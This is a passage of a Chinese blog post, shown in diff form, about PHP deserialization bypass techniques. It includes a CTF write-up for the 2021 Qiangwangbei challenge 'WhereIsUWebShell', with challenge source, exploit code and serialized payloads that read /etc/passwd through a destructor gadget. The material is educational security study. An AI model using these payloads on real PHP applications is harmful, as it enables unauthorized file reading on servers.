+     <span class="p">[</span><span class="s2">"a"</span><span class="p">]</span><span class="o">=&gt;</span>
+     <span class="o">&amp;</span><span class="nf">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">"flag"</span>
+     <span class="p">[</span><span class="s2">"flag"</span><span class="p">]</span><span class="o">=&gt;</span>
+     <span class="o">&amp;</span><span class="nf">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">"flag"</span>
+ <span class="p">}</span>
+</code></pre></div>    </div>
+    <p>解决的办法是使用一些诸如 Error 的内置类，当然更为方便的是使用 stdClass。</p>
+  </li>
+</ol>
+
+<p>exp.php</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">stdClass</span><span class="p">();</span>
+<span class="nv">$a</span><span class="o">-&gt;</span><span class="n">flag</span> <span class="o">=</span> <span class="s2">"flag"</span><span class="p">;</span>
+<span class="nv">$a</span><span class="o">-&gt;</span><span class="n">a</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$a</span><span class="o">-&gt;</span><span class="n">flag</span><span class="p">;</span>
+
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="c1">// O:8:"stdClass":2:{s:1:"a";S:4:"  ";S:4:"\66\6c\61\67";R:2;}</span>
+</code></pre></div></div>
+
+<h2 id="二次序列化绕过">二次序列化绕过</h2>
+<p>PHP 在遇到不存在的类时，会把不存在的类转换成 __PHP_Incomplete_Class 这种特殊的类，同时将原始的类名A存放在 __PHP_Incomplete_Class_Name 这个属性中，其余属性存放方式不变。</p>
+
+<p>在序列化这个对象的时候，serialize 遇到 __PHP_Incomplete_Class 这个特殊类会倒推回来，序列化成 __PHP_Incomplete_Class_Name 值为类名的类.</p>
+
+<p>但是 __PHP_Incomplete_Class 这个特殊的类在经过了反序列化和序列化后，得到的结果与初始类不同，达到了如下的效果：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">serialize</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$x</span><span class="p">))</span> <span class="o">!=</span> <span class="nv">$x</span>
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$b</span> <span class="o">=</span> <span class="s1">'a:2:{i:0;O:8:"stdClass":1:{s:3:"abc";N;}i:1;O:22:"__PHP_Incomplete_Class":1:{s:3:"abc";N;}}'</span><span class="p">;</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">))));</span>
+
+<span class="c1">// 结果:</span>
+<span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
+  <span class="nf">object</span><span class="p">(</span><span class="n">stdClass</span><span class="p">)</span><span class="c1">#3 (1) {</span>
+    <span class="p">[</span><span class="s2">"abc"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="kc">NULL</span>
+  <span class="p">}</span>
+  <span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=&gt;</span>
+  <span class="nf">object</span><span class="p">(</span><span class="n">__PHP_Incomplete_Class</span><span class="p">)</span><span class="c1">#4 (1) {</span>
+    <span class="p">[</span><span class="s2">"abc"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="kc">NULL</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
+  <span class="nf">object</span><span class="p">(</span><span class="n">stdClass</span><span class="p">)</span><span class="c1">#3 (1) {</span>
+    <span class="p">[</span><span class="s2">"abc"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="kc">NULL</span>
+  <span class="p">}</span>
+  <span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=&gt;</span>
+  <span class="nf">object</span><span class="p">(</span><span class="n">__PHP_Incomplete_Class</span><span class="p">)</span><span class="c1">#4 (0) {</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>例题: 强网杯2021 WhereIsUWebShell</p>
+
+<p>index.php</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// index.php</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'display_errors'</span><span class="p">,</span> <span class="s1">'on'</span><span class="p">);</span>
+
+<span class="k">include</span> <span class="s2">"function.php"</span><span class="p">;</span>
+<span class="nv">$res</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'ctfer'</span><span class="p">]);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/myclass/i'</span><span class="p">,</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$res</span><span class="p">))){</span>
+	<span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Error: Class 'myclass' not found "</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
+<span class="nb">highlight_file</span><span class="p">(</span><span class="s2">"myclass.php"</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>	
+<span class="nb">highlight_file</span><span class="p">(</span><span class="s2">"funct但ion.php"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>function.php</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// function.php</span>
+<span class="k">function</span> <span class="n">__autoload</span><span class="p">(</span><span class="nv">$classname</span><span class="p">){</span>
+    <span class="k">require_once</span> <span class="s2">"./</span><span class="nv">$classname</span><span class="s2">.php"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>myclass.php</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// myclass.php</span>
+<span class="kd">class</span> <span class="nc">Hello</span><span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>   
+		<span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">qwb</span><span class="p">)</span> <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">qwb</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>分析题目的场景:</p>
+<ol>
+  <li>首先将用户输入进行反序列化</li>
+  <li>然后将结果再次序列化之后匹配 myclass.</li>
+  <li>function.php 中可以通过类名包含对应的文件.</li>
+  <li>myclass.php 中存在文件读取函数,可以用于读取 flag.我们可以序列化一个 Hello 对象,在 Hello 反序列化后进行销毁时即可调用 file_get_contents. 但 __destruct 需要在对象销毁时才进行调用,当对象 Hello 还未销毁时即会被 preg_match 匹配,进而抛出异常提前结束.</li>
+</ol>
+
+<p>思路:</p>
+<ol>
+  <li>将 myclass 包裹在 __PHP_Incomplete_Class 中,这样反序列化时可以成功创建 myclass 类,而二次序列化时,__PHP_Incomplete_Class 序列化字符串中的 myclass 被清除.</li>
+  <li>另外,由于 Hello 类在 myclass.php 中定义,但 myclass.php 没有被包含进来,所以在构造 payload 时添加一个 myclass 类,触发 function.php 中的 autoload ,进而包含 myclass.php</li>
+</ol>
+
+<p>exp</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// myclass.php</span>
+<span class="kd">class</span> <span class="nc">myclass</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kd">class</span> <span class="nc">Hello</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$qwb</span> <span class="o">=</span> <span class="s2">"/etc/passwd"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$m</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">myclass</span><span class="p">;</span>
+<span class="nv">$m</span><span class="o">-&gt;</span><span class="n">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">myclass</span><span class="p">;</span>
+<span class="nv">$n</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Hello</span><span class="p">;</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="o">=&gt;</span><span class="nv">$m</span><span class="p">,</span><span class="mi">1</span><span class="o">=&gt;</span><span class="nv">$n</span><span class="p">);</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+<span class="c1">// a:2:{i:0;O:7:"myclass":1:{s:1:"a";O:7:"myclass":1:{s:1:"a";N;}}i:1;O:5:"Hello":1:{s:3:"qwb";s:11:"/etc/passwd";}}</span>
+</code></pre></div></div>
+<p>由于 __PHP_Incomplete_Class 不方便直接构造,所以可以先生成 myclass,然后再改成 __PHP_Incomplete_Class:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a:2:{i:0;O:22:"__PHP_Incomplete_Class":1:{s:1:"a";O:7:"myclass":1:{s:1:"a";N;}}i:1;O:5:"Hello":1:{s:3:"qwb";s:11:"/etc/passwd";}}
+</code></pre></div></div>
+<p>这样就可以通过 __PHP_Incomplete_Class 二次序列化会把其中的内容制空的特性,绕过了 myclass 的检测.</p>
+
+<p>非预期: Fast desctruct</p>
+
+<p>当然,这一道题可以利用 Fast desctruct 特性,破坏序列化字符串可以使得在 unserialize 方法执行时因为出错直接调用 Hello 类的 __destruct 方法,进而包含文件. 删除最后一个大括号即可</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nc">O</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">"myclass"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">"a"</span><span class="p">;</span><span class="nc">O</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">"myclass"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">"a"</span><span class="p">;</span><span class="nc">N</span><span class="p">;}}</span><span class="n">i</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span><span class="nc">O</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">"Hello"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">"qwb"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="s2">"/etc/passwd"</span><span class="p">;}</span>
+</code></pre></div></div>
+
+<h1 id="参考">参考：</h1>
+<ul>
+  <li><a href="https://blog.ieki.xyz/pages/39112e/#php%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80">PHP序列化问题</a></li>
+  <li><a href="https://www.scuctf.com/ctfwiki/web/5.unserialize/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php71">PHP 反序列化</a></li>
+</ul>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2023-06-08T06:06:04+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/php/2023/06/08/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A0%BC%E5%BC%8F%E5%9F%BA%E7%A1%80.html">php 反序列化格式基础</a></div><div class="next"><span>NEXT</span><a href="/php/2023/06/08/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8.html">php 反序列化字符逃逸</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© DumKiy's blog 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
